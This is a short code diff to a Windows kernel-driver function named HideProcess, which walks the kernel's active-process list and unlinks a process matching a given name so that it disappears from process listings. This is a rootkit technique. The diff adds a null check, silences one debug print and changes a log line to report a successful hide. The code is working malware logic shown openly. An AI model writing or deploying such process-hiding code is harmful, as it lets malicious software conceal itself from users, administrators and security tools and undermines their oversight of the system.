@@ -53,6 +53,8 @@ VOID HideProcess(char* ProcessName)
 	PEPROCESS EProcessPre = NULL;
 	PLIST_ENTRY Temp = NULL;
 
+	if (!ProcessName)
+		return;
 
 	SetActiveOff();
 	EProcessCurrent = PsGetCurrentProcess();
@@ -61,14 +63,14 @@ VOID HideProcess(char* ProcessName)
 
 	while (EProcessCurrent != EProcessPre)
 	{
-		DbgPrint("%s\r\n", (char*)((ULONG_PTR)EProcessCurrent + ImageName));
+		//DbgPrint("%s\r\n", (char*)((ULONG_PTR)EProcessCurrent + ImageName));
 		if (strcmp((char*)((ULONG_PTR)EProcessCurrent + ImageName), ProcessName) == 0)
 		{
 			Temp = (PLIST_ENTRY)((ULONG_PTR)EProcessCurrent + ActiveOffsetNext);
 			if (MmIsAddressValid(Temp))
 			{
 				RemoveEntryList(Temp);
-				DbgPrint("%s\r\n", &ProcessName);
+				DbgPrint("[process] Hide %s is Success", &ProcessName);
 			}
 			break;
 		}
